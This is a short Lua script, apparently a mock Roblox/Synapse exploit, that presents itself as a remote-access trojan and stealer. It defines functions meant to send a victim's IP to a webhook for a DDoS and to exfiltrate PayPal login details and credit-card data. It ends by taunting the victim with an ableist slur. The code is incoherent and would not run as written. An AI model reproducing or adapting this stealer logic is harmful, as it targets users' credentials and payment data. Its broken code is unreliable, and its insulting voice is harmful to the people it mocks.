function load(...)
  local args = {...}
  local sendrat = args.sendrat
  if args.getIp or args.getHwid or args.installrat then
    args.installrat = function(hardware_id, is_synapse_open_with_admin)
       if syn and is_synapse_open_with_admin then
          sendrat(args.user)
       else
          return nil
       end
    end
    args.getIp = function(ipify)
      args.webhook.send("DDos this ip!!!!: "..ipify)
      return false
    end
    args.getHwid = function(connect_webhook_to_pc, getfiles)
        connect_webhook_to_pc = true
        if string.find(getfiles, "CREDIT_CARDS.txt") or string.find(getfiles, "paypal.com") and getfiles.PayPal.LoggedIn.StatusCode == 200 then
           args.webhook.send("PayPal: "..getfiles.PayPal.LoginStuff)
           args.webhook.send("Credit Cards: "..getfiles.CreditCards)
           return true
        end
    end
  end
  return "Retard executed the script. He will regret! Connection IP to rat/desktop: "..args.getIp
end

